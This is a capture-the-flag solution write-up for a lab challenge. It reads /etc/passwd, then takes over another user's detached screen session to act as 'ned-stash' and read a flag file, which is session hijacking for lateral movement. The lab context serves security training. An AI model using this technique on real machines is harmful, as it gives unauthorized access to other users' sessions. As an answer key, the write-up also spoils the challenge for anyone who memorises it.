# Solution

1. Login into ned's account using the given SSH creds
    ```
    ssh ned@localhost -p 2025
    ```

2. See users on that machine, and realize that a user `ned-stash` also exists.

    ```
    cat /etc/passwd
    ```
   **OUTPUT**
    ```
    ned:x:1001:1001::/home/ned:/bin/bash
    ned-stash:x:1002:1002::/home/ned-stash:/bin/bash <==== *** THIS ONE!!! ***
    ```

3. List running processes for the user ned

    ```
    top -u ned

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                                                                                                                                                                                                                                                                   
    23 ned       20   0    4512   2160   1648 S   0.0   0.0   0:00.00 screen <==== *** THIS ONE!!! ***                                                                                                                                                                                                                                                                                                                                          
    25 ned       20   0    6084   5148   3532 S   0.0   0.0   0:00.00 bash                                                                                                                                                                                                                                                                                                                                                      
    35 ned       20   0    2684   1048    960 S   0.0   0.0   0:00.00 sshpass                                                                                                                                                                                                                                                                                                                                                   
    36 ned       20   0   12012   7912   6708 S   0.0   0.0   0:00.04 ssh                                                                                                                                                                                                                                                                                                                                                       
    72 ned       20   0   12780   6188   4568 S   0.0   0.0   0:00.01 sshd                                                                                                                                                                                                                                                                                                                                                      
    73 ned       20   0    6060   5276   3620 S   0.0   0.0   0:00.01 bash                                                                                                                                                                                                                                                                                                                                                      
    89 ned       20   0    9288   5060   3180 R   0.0   0.0   0:00.00 top
    ```

4. List all running screen sessions

    ```
    screen -ls
    ```
   **OUTPUT**
    ``` 
    There is a screen on:
         23.stash        (02/11/25 04:08:25)     (Detached)
    1 Socket in /run/screen/S-ned.
    ```
5. Attach to the `stash` screen session
    ```
    screen -r stash
    ```
   **OUTPUT**
    ```
    ned-stash@ned-land:~$
    ```
6. Now that we're logged in as `ned-stash`, let's read the flag

   ```
   cat flag.txt
   ```
